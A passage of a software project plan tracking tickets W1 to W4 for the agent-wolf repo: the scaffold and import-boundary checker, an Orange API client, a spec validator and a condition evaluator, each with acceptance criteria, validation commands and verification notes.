    `http://localhost:8099` and session containers reach it at
    `http://172.17.0.1:${WOLF_API_PORT}`.
  - `wolf-web` joins Orange's compose network as **external** (`agent-orange_default`), publishes
    `${WOLF_WEB_PORT:-8081}`, and proxies `/api` and `/mcp` to `http://dind:${WOLF_API_PORT}` —
    the same indirection nginx already uses for agentd (`deploy/web.nginx.conf:55`).
  - `.env.example` documents every variable `api/src/config.ts` reads, each with a comment, and
    `ORANGE_DIND_CONTAINER`, `WOLF_API_PORT`, `WOLF_WEB_PORT`, `WOLF_MCP_URL`.
  - **`web/` imports nothing from agent-orange — enforced by a test, and the test is graded on
    this explicit list, not on the phrase "any import specifier".** *(Rewritten 2026-08-21 after
    three failed verification rounds — see **R38**. This list is the criterion. An escape route
    not named here is a plan bug to be logged, not an executor failure.)*
    - **Files scanned:** every file under `web/src` and `web/` root config with an extension in
      `.ts .tsx .js .jsx .mjs .cjs` — i.e. every extension Vite + `@vitejs/plugin-react` will
      resolve. Plus `web/vite.config.ts`, `web/tsconfig.json`, `tsconfig.base.json` and
      `web/package.json` as described below. A regression case must write a temporary `.jsx`
      file with an outside-the-repo import and assert the collector picks it up, so the extension
      list cannot silently fall behind the bundler's again.
    - **Specifier forms caught:** static `import`/`export ... from`; **dynamic `import(...)`**;
      **`require(...)`**; type-only `import type`; and side-effect `import "..."`.
    - **Specifier kinds resolved:**
      - *relative* (`./`, `../`) — resolve and assert the realpath is inside the repo, by path
        segment, **not** by string prefix (`/repo-evil` must not count as inside `/repo`).
      - *absolute* (`/home/...`) — resolve with `realpathSync` when it exists and run through the
        same containment check. **Must not** fall through the bare-specifier branch: an empty
        package name resolving to `web/node_modules` is the exact hole round 3 found.
      - *bare* (`react`, `@mui/material`) — allowed only if declared in `web/package.json`'s
        `dependencies`/`devDependencies` or the root `package.json`'s. A declared-but-not-installed
        specifier passes; a specifier declared nowhere fails.
    - **Config escape routes:** `web/vite.config.ts`'s `resolve.alias` (every shape Vite accepts —
      object, or array of `{find, replacement}`), and `compilerOptions.paths` in **both**
      `web/tsconfig.json` and `tsconfig.base.json`. Any target resolving outside the repo fails.
    - **Manifest escape route:** any dependency in `web/package.json` or the root `package.json`
      whose specifier starts with `file:`, `link:` or `portal:` fails.
    - The suite must not fail against its own comments: use a placeholder token in prose rather
      than a literal quoted specifier.
  - **`api/` is held to the same boundary.** The architecture forbids it importing Orange code
    just as firmly, and nothing asserted it. Reuse the same checker; do not write a second one.
  - `README.md` gives the exact two-repo start sequence: bring Orange up, then Wolf, in that
    order, with the reason (the external network must exist first).
  - The pinned choices in § "Pinned technology choices" are installed and wired: Express 5,
    `@modelcontextprotocol/sdk`, vitest, `undici` `MockAgent`, React 18.3.1 + MUI 6, Recharts,
    zod, pino. No alternative is substituted; a later ticket needing something else must log it
    rather than swap it.
  - `api/src/errors.ts` exists with the `WolfError` class and the **seven** `WolfErrorKind`
    values exactly as written in § "Shared error taxonomy", plus a test asserting `not_found` and
    `unavailable` are distinct and that `misconfigured` carries the offending variable name.
  - **An unhandled throw maps to `internal`, never to `unavailable`** (**R39**). The Express
    error handler classifies a non-`WolfError` throw as `internal`/500, does **not** put the
    thrown message in the response body, and logs the real error server-side. Tested: throw a
    bare `Error("secret-ish detail")` from a route and assert the response body does not contain
    that string and that `kind` is `internal`.
  - **`web/` uses vite 6** (**R40**), so one resolver evaluates `web/vite.config.ts` under both
    `vitest run` and `vite build`. `yarn install` must emit **no unmet-peer warning** for vitest,
    and `web/node_modules/vitest/node_modules/vite` must not exist — assert the absence, because
    that nested copy is the actual defect. React/MUI stay at `examples/web`'s versions.
  - **React, react-dom and react-is are pinned exactly (`"18.3.1"`, no caret)**, matching
    `examples/web/package.json`'s form as § "Pinned technology choices" intends.
  - **The DinD gateway is discovered at boot, not hard-coded** (**R43**). `api/src/config.ts`
    resolves it as described in § "Local topology and networking": explicit `WOLF_MCP_URL` wins;
    otherwise read the default route from DinD's netns; otherwise fall back to `172.17.0.1` and
    log which was used. Unit-tested with a fake route source covering all three paths.
  - **A repo-root `.dockerignore` exists** listing at least `node_modules`, `**/node_modules`,
    `.git`, `dist`, `.env`, `coverage` — both Dockerfiles use the repo root as build context and
    `COPY api ./api` / `COPY web ./web` run *after* `yarn install`, so without it a host
    `node_modules` overwrites the installed tree inside the image.
  - **The `/mcp` nginx location carries the same SSE-safe directives as `/api/`**
    (`proxy_buffering off; proxy_cache off; proxy_read_timeout 3600s;`). Streamable HTTP's
    server-to-client leg is an SSE stream on `GET /mcp`; nginx's 60s default would cut it.
  - `yarn typecheck` and `yarn test` pass from a clean checkout in both packages.
- **TDD:** no for the scaffold; **yes** for `errors.ts`.
- **Validation:**
  - `yarn install --frozen-lockfile && yarn typecheck && yarn test` — from a **clean export**
    (`git archive <branch> | tar -x` into a temp dir), not from the working tree
  - `dcc` (the redacted wrapper from § "Executor orientation" — **not** bare
    `docker compose config`, which prints `WOLF_API_KEY` and `FRED_API_KEY` in the clear once they
    are set, **R82**) resolves and shows the `network_mode` and external network
  - **Empirical, not declarative** (**R41**): `docker build` both images, then run wolf-web
    against a stub backend aliased `dind` and assert a request to `/api/healthz` arrives at the
    backend as **`/api/healthz`** — the literal prefix, unstripped (**R37**)
- **Depends on:** —
- [x] done — F1/F2/F3 closed by W1b on 2026-08-21
- Notes: **Implemented 2026-08-20; 10 of 11 criteria verified PASS; ESCALATED on the eleventh.**
  Branch `W1-wolf-repo-scaffold`, five commits ending `6b59b4f`. `yarn typecheck` and
  `yarn test` are green from a clean `git archive` export (20 tests), `docker compose config`
  resolves, and both images build; the verifier proved the `/api` proxy hop empirically rather
  than by reading the config. The owner-mandated archival landed as `c1f45b5` with git recording
  a rename, and the nine research briefs survive under
  `docs/archive-2026-05-hypothesis-bot/`.
  **Round 4 (2026-08-21), against the rewritten criteria — 19 of 22 sub-criteria PASS, 3 fail.**
  The rewrite worked. The verifier ran **21 escape probes** and **all 12 mandated ones were
  caught**, plus two it invented (a symlinked directory into agent-orange, and `export * from` an
  outside path). The branch adds a third yarn workspace `tools/import-boundary` holding one shared
  checker used by both `web/` and `api/`, `internal` as the seventh error kind, vite 6, boot-time
  gateway discovery (proven live: `{"mcpUrlSource":"discovered"}`), `.dockerignore`, SSE
  directives on `/mcp`, and an empirical proxy proof (`curl /api/healthz` arrives as
  `PATH=/api/healthz`, unstripped).
  **Three failures remain, all of them the implementation not matching a now-precise criterion —
  a different and much smaller problem than rounds 1–3:**
  - **F1 (blocking)** — root config files are never scanned. `checkImportBoundary` walks only
    `srcDir` (`tools/import-boundary/src/index.ts:246`), so `web/vite.config.ts` and
    `api/vitest.config.ts` may import anything. The criterion says "every file under `web/src`
    **and `web/` root config**".
  - **F2 (major)** — the bare-specifier rule is looser than written: any specifier resolving into
    `node_modules` passes regardless of declaration (`:291-306`); the `declared` set is consulted
    only when resolution *fails*. The criterion requires declaration.
  - **F3 (minor)** — template-literal specifiers are unmatched (`:42-46` restricts the quote class
    to `["']`), so a `require` with backticks escapes.
  Five further probes missed are **not** criterion failures and were correctly reported as plan
  gaps: `.mts`/`.cts` sources, computed/non-literal dynamic specifiers, and a bare specifier
  hoisted into `node_modules` but declared in no manifest.
  **Defects found in the rewritten criterion itself**, recorded so revision 4 does not repeat them:
  it names `web/node_modules/vitest/node_modules/vite` as the path to assert absent, but yarn
  classic hoists — that path never existed even when the defect did, and the real nested copy was
  at the repo root; raising vite to 6 alone does **not** close the hole, because vitest 4 carries
  vite as a real `dependencies` entry with its own range string that yarn classic resolves
  independently; the gloss "every extension Vite will resolve" is factually wrong (vite 6.4.3 also
  resolves `.mts` and `.cts`); `tools/import-boundary` is itself held to no boundary by any
  criterion; and only `compilerOptions.paths` is enumerated, while `baseUrl`, `extends` chains and
  additional tsconfigs are equivalent escapes. R41's first half is also still open — nothing ties
  `.env.example` to `config.ts`, and eight later tickets add config.
  **CLOSED 2026-08-21 by W1b, branch `W1b-import-boundary-fixes`, commit `acdcdbc`, no fix round.**
  All three failures are fixed and each is pinned by a test that was proven to fail before the fix:
  **F1** — the checker now scans root config files as well as `srcDir`, so `web/vite.config.ts` and
  `api/vitest.config.ts` are covered; **F2** — a bare specifier must be **declared**, not merely
  resolvable into `node_modules`; **F3** — template-literal specifiers are matched. Orchestrator
  re-ran the gates: `yarn typecheck` clean, 36 api + 15 web tests green (up from 32 + 14), every
  pre-existing escape probe still caught. The five probes this Notes block calls "not criterion
  failures" — `.mts`/`.cts` sources, computed dynamic specifiers, and a bare specifier hoisted into
  `node_modules` but declared in no manifest — were deliberately left open; they are plan gaps, not
  ticket failures. One new one joins them: **R75**, the checker reads a regex or string literal in a
  test file as a real import.

### W2: Orange client   [Status: done | Model: sonnet]
- **Scope:** A typed client for every Orange route Wolf touches. **The list is exhaustive and
  closed** — no later ticket may edit `api/src/orange/client.ts` except W15, which is strictly
  serial after this one. Twenty-two routes:
  `POST /agent/session`; `GET /agent/sessions/by-name/{name}`; `DELETE /agent/session/{id}`;
  `GET /agent/sessions` (always `?user_email=*`, optional `&worker=`);
  `POST /agent/memories` (**expects 201**, R36); `GET /agent/memories` (params `selector`, `query`,
  `limit`, `latest_per`, `since`, `until`, **and `include_retracted=1`** — O11);
  `GET /agent/memories/{id}`; `GET /agent/memories/current?name=`;
  `GET /agent/datasets`; `GET /agent/datasets/{name}`; `GET /agent/datasets/{name}/download`;
  `PUT /agent/workers/{name}`; `DELETE /agent/workers/{name}`;
  `POST /agent/schedules`; `GET /agent/schedules`; `DELETE /agent/schedules/{id}`;
  `GET /agent/deliveries`; `GET /agent/attention-requests`;
  `GET /agent/project-settings`; `PUT /agent/project-settings`;
  `POST /agent/embed-token`; `POST /auth/verify-google`.
  Four of these exist only because a later ticket needs them and owns no client file:
  `include_retracted` (W5's retraction defence), the session list (W5, W9, W10),
  `attention-requests` (W10) and `project-settings` (W12's bootstrap, which read-merge-writes).
- **Repo:** agent-wolf
- **Files:** `api/src/orange/client.ts`, `api/src/orange/types.ts`,
  `api/src/orange/client.test.ts`, `api/src/orange/types.test.ts`.
- **Acceptance criteria:**
  - **One method per route, twenty-two of them**, each with a test asserting the method, the path
    and every query parameter it sends, driven through `undici` `MockAgent`. No live network in
    any test.
  - **The client reads no environment variable.** It is constructed as
    `createOrangeClient({ baseUrl, apiKey })`; the caller supplies both. A test reads
    `client.ts` and `types.ts` off disk and asserts neither contains `process.env`. *(This is not
    fastidiousness: `api/src/config.ts` and `.env.example` are owned by W1/W16/W21 and W2 may not
    edit them, so a client that reads config directly cannot be built without breaking the file
    ownership rule — see `unresolved`.)*
  - The API key is held in a closure-private constant and reaches only the `X-API-Key` request
    header. Graded on exactly two tests, no more and no fewer: **(a)** a `WolfError` thrown by a
    failed call, `JSON.stringify`-ed including `upstreamBody` and `cause`, contains no substring
    of the key; **(b)** a `pino` instance with a capturing destination records one failing and one
    succeeding call and no emitted line contains the key. The client writes no HTTP response, so
    there is no third surface to grade.
  - **Timestamp units are branded types**, declared once in `api/src/orange/types.ts`:
    `export type UnixMs = number & { readonly __unit: "ms" }` and
    `export type UnixSec = number & { readonly __unit: "s" }`, with `toMs` / `toSec` the only
    conversions. Memory and dataset fields are `createdAtMs: UnixMs`; session fields and
    `expiresAtSec` are `UnixSec`. The proof is compile-time, in `api/src/orange/types.test.ts`: a
    fixture assigning a `UnixSec` where a `UnixMs` is expected, marked `// @ts-expect-error`. A
    field *name* creates no TypeScript incompatibility, so a plainly-named `number` cannot satisfy
    this and a runtime test asserting `1755600000000 !== 1755600000` proves nothing about the code.
  - **Non-2xx responses become `WolfError`s** carrying Orange's status and body verbatim in
    `upstreamBody`, with this **fixed** mapping, table-tested one row per status:
    `404 → not_found`; `409 → conflict`; `403 → forbidden`; `400`/`422 → invalid`;
    `410 → not_found` (the row exists but the blob is gone — callers treat it as absent);
    `501 → misconfigured`, naming `DATABASE_URL`; `500`/`502`/`503`/`504`, a connection refusal or
    a timeout `→ unavailable` (Orange being down is an upstream outage, not a Wolf bug); anything
    else `→ internal`. A comment records that `unavailable` is the only kind W10 retries, which is
    why a 500 must not land there.
  - **One documented exception to that table:** a `404` from `POST /auth/verify-google` is
    `misconfigured` naming **`GOOGLE_CLIENT_ID`**, not `not_found` — Orange 404s that route when
    the variable is unset on *Orange*, and W8 must surface it as a configuration error rather than
    an auth failure.
  - **A `403` refusing a session create because the host port pool is exhausted maps to
    `unavailable` and preserves Orange's message verbatim** — "host port pool is exhausted" is
    operational and actionable, retryable is the correct semantics (deleting a finished session
    frees a port), and flattening it into "could not create" throws away the only useful part.
  - `GET /agent/sessions` is always called with `?user_email=*`; an API key's synthetic email
    (`api-key:<project>`) matches no session row and the list would otherwise come back empty.
    A test asserts the parameter is present on every call, including when `&worker=` is also set.
  - **Snippet reads and full-content reads are different types.** `GET /agent/memories` returns
    rows with `snippet` and **no** `content` field (the store caps it at 500 characters);
    `GET /agent/memories/{id}` and `/current` return `content` in full. A test asserts a
    >600-character body round-trips whole through the two full-content methods.
  - **Every memory read returns provenance** (`createdByWorker`, `createdBySession`) and the
    client does not strip them; the list read also surfaces `retractedBy` (O11's shape) when
    present. Asserted per method.
  - Dataset metadata types match § "Dataset metadata JSON" field for field —
    `id, name, version, labels, size_bytes, row_count, sha256, content_type, created_by_worker,
    created_by_session, created_at` (unix ms), with `blob_path` and `project` **absent** — and the
    envelopes are honoured: the list route returns `{"datasets":[…]}`, the single-name route
    returns the **bare object**. A test asserts an unexpected envelope is an `invalid` error rather
    than silently yielding `undefined` — W10's version gate compares `version` values, and
    `undefined !== undefined` would make it re-download every CSV 288 times a day while its own
    mocked test passed.
  - `POST /agent/memories` treats **201** as success (R36) and any other 2xx as an `internal`
    error naming the status, so a silent contract change surfaces rather than being absorbed.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/orange` — exits 0. `vitest` exits **1** when a path filter matches no
    files, so a green run here does mean the suite ran
  - `cd api && grep -c "it(" src/orange/client.test.ts` — at least 22, one per route, plus the
    mapping and provenance cases
  - `cd api && yarn typecheck` — passes
  - **The brand proof, two steps:** delete the `& { readonly __unit: "ms" }` suffix from `UnixMs`
    in `src/orange/types.ts` and re-run `yarn typecheck` — it must **fail** with "Unused
    '@ts-expect-error' directive". Restore the suffix and confirm it passes again. A brand that
    has collapsed to `number` cannot be detected any other way
- **Depends on:** W1 *(and O7 for the append route's 201, O11 for `include_retracted` — the unit
  tests mock the HTTP layer with `MockAgent`, so neither Orange ticket blocks this one)*
- [x] done
- Notes: **Delivered on branch `W2-orange-client`, commit `c71d97d`, based on
  `W1-wolf-repo-scaffold` (not merged to `main`). One fix round.** Orchestrator re-ran the
  Validation on 2026-08-21: `yarn typecheck` clean, `yarn test src/orange` green (**52 tests**,
  49 `it(` blocks against a floor of 22), neither `client.ts` nor `types.ts` contains `process.env`,
  and the destructive brand proof behaves exactly as specified — deleting the `__unit: "ms"` suffix
  makes `tsc` fail with `error TS2578: Unused '@ts-expect-error' directive`, and restoring it
  passes.
  **R46 is CLOSED and was already closed before this ticket ran** — the twenty-two-route list in
  Scope above already contains all four routes R46 said were missing (`GET /agent/sessions` with
  `worker=`, `include_retracted=1`, `attention-requests`, and `project-settings` GET+PUT). Revision 4
  fixed the ticket body; only the log entry was stale.
  One residual coverage gap, deliberately left rather than silently widened: `mapDatasetMetadata`'s
  provenance mapping is proved only indirectly. The dataset fixture carries
  `created_by_worker: ""`, so a rename confined to `mapDatasetMetadata` alone would not be caught,
  where a global rename is (it also hits the three memory mappers). **W15, the only other ticket
  permitted to touch `client.ts`, should close this** by giving the dataset fixture non-empty
  provenance.
  Note for W8: one acceptance criterion above still carries a stale parenthetical claiming
  `config.ts` and `.env.example` are owned by "W1/W16/W21". That ownership claim was superseded by
  the ⚠️ block in § "Parallelism and file ownership"; the operative rule — this client reads no
  environment variable and takes `{ baseUrl, apiKey }` — is unchanged and was followed.

### W2b: The twenty-third Orange route — worker read   [Status: done | Model: sonnet]
- **Scope:** Add `getWorker(name)` to the Orange client and repoint W12's bootstrap at it, removing
  the one raw `fetch` in the repo. Owner decision 2026-08-21 (**R91**): W2's route list was
  declared "exhaustive and closed" and had no worker **read**, while Orange serves one
  (`go/httpapi/workers.go:77`) and W12 is graded on "a second run creates nothing and mutates
  nothing" — undecidable without reading current worker state. W12 resolved it with a narrowly
  scoped raw `fetch` inside `bootstrap-project.ts`, documented at its call site. This ticket makes
  that unnecessary. The list is closed against casual addition, not against an owner ruling.
- **Repo:** agent-wolf
- **Files:** modify `api/src/orange/client.ts`, `api/src/orange/client.test.ts`,
  `api/src/bootstrap/bootstrap-project.ts`, `api/src/bootstrap/bootstrap-project.test.ts`.
- **Acceptance criteria:**
  - `client.getWorker(name)` calls `GET /agent/workers/{name}` with the project API key, and its
    result type is `WorkerRecord` — **the type `putWorker` RETURNS**, not the type it accepts. One
    type, not a second one that happens to have the same fields. *(Corrected 2026-08-21, **R108**:
    this criterion originally said "the shape `putWorker` accepts", which is `PutWorkerParams` — an
    all-optional params bag carrying a `rationale` field no read can ever return. Taken literally it
    is unsatisfiable and would force the wrong type. W2b's verifier caught the wording and graded
    the sane reading.)*
  - **A 404 maps to `not_found`, not to `unavailable`.** § "Shared error taxonomy" makes this
    load-bearing: `unavailable` is the one **retryable** kind, and the bootstrap's whole use of
    this call is "does this worker exist yet?", so conflating them turns a first run into a retry
    loop. A test drives the 404 and asserts the kind.
  - The call goes through the **same** retry, timeout, error-mapping and logging path as every
    other route on the client. A test asserts a 503 from this route produces `unavailable` exactly
    as it does for an existing route — no bespoke handling.
  - `bootstrap-project.ts` uses `getWorker` and the raw `fetch` is **gone**. A test asserts the
    bootstrap module's source contains no `fetch(` call, and the existing idempotency criterion
    ("a second run creates nothing and mutates nothing; the set of create/PUT calls on run 2 is
    empty") still passes unchanged against the new path.
  - **W2's route list comment is updated to say twenty-three and to name this route**, so the next
    reader is not told the list is closed at twenty-two while the code disagrees. This is the
    documentation half of the ticket and it is a criterion, not a nicety.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/orange/client src/bootstrap --reporter=verbose` — confirm both files'
    test counts went up.
  - `cd api && yarn typecheck && yarn test` (whole package; report file and test totals).
  - `grep -n 'fetch(' api/src/bootstrap/bootstrap-project.ts` prints nothing.
- **Depends on:** W2, W12, **and W15** *(W15 holds `api/src/orange/client.ts` immediately before
  this ticket and closes three separate defects in it — `classifyStatus`'s missing 401 case, the
  port-pool override's status/kind mismatch, and `mapMemorySearchRow`'s fail-open on missing
  provenance. Branch this from a `main` that already carries W15, or the two will conflict on the
  same file and the error-mapping criterion above will be graded against the pre-fix taxonomy.)*
- [x] done — verified 2026-08-21, 7/7 criteria, zero fix rounds
- Notes: **Implemented and independently verified 2026-08-21 — 7 of 7 criteria PASS, zero fix
  rounds.** Branch `W2b-orange-worker-read`, commit `56f110c`, merged to `main`. api/ 644 → **648
  tests**. `getWorker(name)` needed **no** `errorOverride`: the client's default mapping already
  sends 404 → `not_found` and 5xx → `unavailable`, so the load-bearing criterion is satisfied by
  going through the shared path rather than around it — which is also the second criterion. The raw
  `fetch` is gone from `bootstrap-project.ts`, and with it the whole `fetchImpl` plumbing that
  existed only to inject it. **W12's idempotency assertion still passes byte-identical and
  unchanged**, which is what proves the rewrite did not quietly relax the thing it was rewriting
  around. `readWorker` swallows only `not_found` and **rethrows every other kind**, so an Orange
  outage cannot masquerade as "worker absent" and cause a PUT over a live worker.
  Three minor defects accepted, all worth carrying forward: (1) **R108** — a wording error in this
  ticket, written the same day from an owner ruling; the verifier caught it and graded the sane
  reading rather than forcing the wrong type. (2) The new non-404 error path in `readWorker` has no
  test; the behaviour is correct on reading, but a future edit widening the catch to
  `return undefined` on any error — which is exactly the failure the rethrow prevents — would be
  caught by nothing in the repo. (3) **R109** — a pre-existing W2 hole this ticket inherits: **no
  test in the shipped suite asserts that any route sends `X-API-Key` at all.** 6 guesses.
### W3: Spec and condition schema + validator   [Status: done | Model: opus]
- **Scope:** The spec type, the condition type, and the validator that is the **sole gate** on
  go-live. The graded rule set is the numbered list **V1–V27** below — that list, not the run-on
  paragraph in **Interfaces**, is what a verifier counts, because "every rule" over an unnumbered
  paragraph is worth between 17 and 21 depending on how compound clauses are split, and a ticket
  that fails on an arithmetic disagreement rather than on behaviour is the R38 failure shape.
  Exported signature, non-throwing because three tickets need the error list without a 500:
  `validateSpec(input: unknown): { valid: true; spec: Spec } | { valid: false; errors: SpecError[] }`
  where `SpecError = { path: string; message: string }` — the same `{path, message}` shape W9
  returns in its `422` and W8 embeds as `spec_validation`. `Spec`, `Metric`, `Method` and
  `Condition` are exported from this module and every later ticket imports them rather than
  redeclaring.
  **The spec gains no report section.** The report template is a separate memory validated by W16
  and W17, not by this validator — "the interview designs the report" is not a spec change.
- **Repo:** agent-wolf
- **Files:** `api/src/hypothesis/spec.ts`, `api/src/hypothesis/spec.test.ts`,
  `api/src/hypothesis/__fixtures__/worked-spec.json`.
- **The graded rule set.** Schemas are built with zod (pinned) and are **strict** at every level.
  *Spec:* **V1** `thesis` required, non-empty string. **V2** `horizon_days` an integer in
  `[7, 3650]`. **V3** `flat_band_pct` a number in `[0, 50]`, defaulting to `2.0`. **V4**
  `staleness_days` a number in `[1, 90]`, defaulting to `5`. **V5** at least one metric. **V6** at
  least one invalidation condition. **V7** unknown keys are rejected at spec, metric, method and
  condition level alike, each error naming its JSON path — a stripping parser silently loses any
  field an amendment added, and W9 writes this object to a memory that W10 and W14 read back.
  *Metric:* **V8** `slug` unique across metrics, matching the label-value charset
  `^[A-Za-z0-9]([-A-Za-z0-9_.]*[A-Za-z0-9])?$`, and **≤ 50 characters** — not 63: the dataset name
  is `<hyp-id>-<slug>`, so a 63-character slug validates here and then fails `dataset_put` on
  every tick forever. **V9** `source` ∈ `{fred, stooq, derived}` — no other provider exists
  (§ Out of Scope). **V10** `direction` ∈ `{up, down, flat}` — this is the enum § "The support
  score" reads. **V11** `unit` a required non-empty string; W14 renders it beside every value.
  **V12** `weight` in `(0, 1]`. **V13** weights sum to `1.0 ± 0.001`. **V14** a non-`derived`
  metric has a non-empty `series_id`. **V15** a `derived` metric has `method` with a non-empty
  `description` and a non-empty `formula`, and no `series_id`.
  *Condition:* **V16** `id` unique within the spec and matching `^[a-z0-9]+(-[a-z0-9]+)*$` —
  duplicate ids silently merge two conditions in W4's per-id result and in W10's
  three-consecutive-indeterminate counter. **V17** `metric` names a metric slug in this spec.
  **V18** `stat` ∈ `{level, change_abs, change_pct, drawdown_pct, ratio_to}`. **V19** `op` ∈
  `{gt, gte, lt, lte}`. **V20** `threshold` a finite number. **V21** `reference` ∈
  `{peak_since_live, value_at_live, trailing_n_days}`, **required unless** `stat` ∈
  `{level, ratio_to}`, where it is **forbidden**. **V22** `reference_days` present iff
  `reference == "trailing_n_days"`, and then an integer in `[2, 365]`. **V23** `ratio_metric`
  present iff `stat == "ratio_to"`, and then naming a metric slug in this spec. **V24**
  `ratio_lookback_days` present iff `stat == "ratio_to"`, and then an integer in `[1, 400]`.
  **V25** `sustained_days` an integer in `[0, 365]`. **V26** `meaning` a required non-empty string.
  *Cross-cutting:* **V27** every metric whose `weight >= 0.25` is named by at least one
  condition's `metric` — a heavy metric that can never falsify anything is a scoreboard with a
  blind spot.
- **Acceptance criteria:**
  - Returns **all** errors at once, each with a JSON path (`metrics[1].weight`,
    `invalidation[0].ratio_lookback_days`), never just the first. A test feeds a spec violating
    six rules at once and asserts six errors with six distinct paths.
  - **One accepting case and one rejecting case for each of V1–V27**, so the suite carries 54
    cases. Each case's name begins with its rule number, e.g. `V21 rejects a level condition that
    carries a reference`. A rule with no case is a ticket failure; a rule the executor believes is
    unimplementable goes in the Discovered Issues Log, not silently dropped.
  - Metric slugs are bounded at **50** characters, with a rejecting case at 51 and an accepting
    case at 50 (V8).
  - A `derived` metric without `method.description` and `method.formula` is rejected (V15) — an
    unpinned derived metric is a scoreboard the critic can silently redefine.
  - `api/src/hypothesis/__fixtures__/worked-spec.json` is the worked example from **Interfaces**
    § "Spec JSON", transcribed as **real JSON** (the printed block is ```jsonc and cannot be
    parsed), with its `invalidation` placeholder replaced by a real array: the condition object
    printed verbatim in § "The condition object" (`inv-1`, on `drone-suppliers-basket`), plus a
    second condition whose `metric` is `petro-settlement-share` — V27 requires one, since both
    metrics carry weight ≥ 0.25 — chosen to satisfy V16–V26. **No metric or spec-level value from
    the printed example may be altered.** Tests assert: `JSON.parse` succeeds, `validateSpec`
    returns zero errors, and `parse → serialise → parse` is stable. If a value as printed in
    **Interfaces** does not validate, that is a plan bug — log it, do not quietly amend the
    fixture to make the ticket pass.
  - The validator is pure and does no I/O; it imports `WolfError`/`WolfErrorKind` from
    `api/src/errors.ts` for the `invalid` kind but adds no new kind.
- **TDD:** yes.
- **Validation:**
  - `cd api && yarn test src/hypothesis/spec` — exits 0. `vitest` exits **1** when a path filter
    matches no files, so a green run here does mean the suite ran
  - `cd api && grep -coE 'V[0-9]+ (accepts|rejects)' src/hypothesis/spec.test.ts` — prints **54**
  - `cd api && grep -oE '\bV[0-9]+\b' src/hypothesis/spec.test.ts | sort -V -u | tr '\n' ' '` —
    prints `V1 V2 … V27` with no gaps; a gap is a rule with no case
  - `cd api && node -e "JSON.parse(require('fs').readFileSync('src/hypothesis/__fixtures__/worked-spec.json','utf8'))"`
    — exits 0, proving the fixture is JSON rather than jsonc
  - `cd api && yarn typecheck`
- **Depends on:** W1
- [x] done
- Notes: **Delivered on branch `W3-spec-validator`, commit `788a216`, based on
  `W1-wolf-repo-scaffold` (not merged to `main`). No fix round.** Orchestrator re-ran the Validation
  on 2026-08-21: `yarn typecheck` clean; `yarn test src/hypothesis/spec` green (**62 tests**); the
  case counter prints exactly **54**; the rule sweep prints `V1 … V27` with no gaps; the fixture
  parses as real JSON.
  **Four conventions this ticket had to invent, which every later spec-touching ticket now inherits
  — see R62–R67 for the full record.** (1) **Explicit `null` counts as ABSENT** for every
  "present iff" rule and every optional field; the returned `Spec` drops the key rather than
  carrying a null. Without this the plan's own printed condition object fails V21–V24. (2) **zod
  4.4.3** is the resolved major, so the idiom is `z.strictObject({…})`, `z.enum(TUPLE as const)`
  and `z.core.$ZodIssue` — a zod-3 `.strict()` chain or a `z.ZodIssue` import will not compile.
  W8–W11 and W21 must match. (3) **Cross-field rules run OUTSIDE zod**, as a separate
  `semanticErrors(input)` pass over the raw input, because zod 4.4.3 does not run a `superRefine`
  when the base parse already produced an issue — with a superRefine, one bad `weight` type would
  hide all six cross-field problems and break the all-errors-at-once criterion. **A later ticket
  adding a rule must add it to the right pass or it silently never fires.** (4) Paths are dotted
  with `[n]` indices and the root is the empty string `""`; V13 files at `metrics`, V27 at
  `metrics[<i>]`.
  Exports later tickets should use rather than redeclare: `Spec` (plus the alias
  `HypothesisSpec = Spec` that W4's signature needs — see R64), `Metric`, `Method`, `Condition`,
  the unions `MetricSource`/`Direction`/`Stat`/`Op`/`Reference`, the const tuples behind them, the
  charset and bound constants, `SpecError`, `formatSpecPath` and `specValidationError(errors)` —
  the canonical `WolfError` wrapper W9's 422 and W8's `spec_validation` should both use so the
  `details` shape does not diverge.
  Two deliberate non-rules: a non-`derived` metric carrying a `method` is **not** rejected, and a
  `ratio_to` condition may name itself in `ratio_metric`. Both would have been ungraded 28th rules;
  if either matters, the guard belongs in W4.

### W4: The condition evaluator   [Status: done | Model: opus]
- **Scope:** Implement § "Condition semantics" exactly: the **five** statistics (`level`,
  `change_abs`, `change_pct`, `drawdown_pct`, `ratio_to` — the Scope line said "four" until R26
  added `change_abs`; the `stat` enum in § "The condition object" is the authority), the three
  references (`value_at_live`, `peak_since_live`, `trailing_n_days`), the sustained-window rule
  with its coverage floor, every indeterminate case, and the support score of § "The support
  score". Pure functions over parsed points: **no I/O, no HTTP, no CSV parsing, no RFC3339
  parsing and no clock read** inside this module — `nowMs` is an argument precisely so the module
  is deterministic. Test names are prefixed `evaluate_` so a later `-t` filter can address them.
- **Repo:** agent-wolf
- **Files:** create `api/src/hypothesis/evaluate.ts`, `api/src/hypothesis/evaluate.test.ts`.
- **Acceptance criteria:**
  - Signature is
    `evaluate(spec: HypothesisSpec, seriesByMetric: Record<string, Point[]>, liveAtMs: UnixMs,
    nowMs: UnixMs): EvaluationResult`, where `Point` is `{ tMs: UnixMs; v: number }` — **unix
    milliseconds, matching `liveAtMs` and `nowMs`**, ascending by `tMs`. Turning RFC3339 CSV into
    `Point[]` is the caller's job (W10 and W11 both do it); this module never sees a date string.
  - `Point`, `EvaluationResult`, `ConditionResult`, `MetricResult` and `Reason` are **exported from
    this module**, and W8, W10, W11, W14 and the report frame import them rather than redeclaring
    `{t, v}`. A `{t, v}` shape anywhere downstream is a silent `NaN` in the window arithmetic, not
    a type error, which is why the export lives here and the name carries the unit.
  - The returned object is exactly § "Shared shapes"'s `EvaluationResult` —
    `{ evaluated_at_ms, support_score, conditions, metrics }` — with no extra and no renamed
    fields, where:
    - `ConditionResult` is `{ id, metric, state: "tripped"|"holding"|"indeterminate",
      reason: Reason|null, value: number|null, threshold: number, op, window_start_ms,
      window_end_ms, observations_in_window }`.
    - `MetricResult` is `{ slug, direction: "up"|"down"|"flat", realised_change_pct: number|null,
      last_observation_ms: UnixMs|null, stale: boolean, stale_reason: Reason|null }` — the field
      names § "Shared shapes" pins, and `metrics` exists because W14 renders expected-vs-actual
      direction and per-metric staleness and W8's board carries `support_score`; nothing else
      computes them.
  - A test asserts the whole result survives `JSON.parse(JSON.stringify(r))` deep-equal, because
    W9 and W10 embed it verbatim in trusted memories and that is the permanent record after the
    dataset reaper has removed the data it was computed from.
  - **The statistic × reference grid is graded on these eleven hand-computed fixtures**, each with
    the expected numbers written out in the test rather than produced by calling the
    implementation: `level`; `change_abs` × each of the three references; `change_pct` × each of
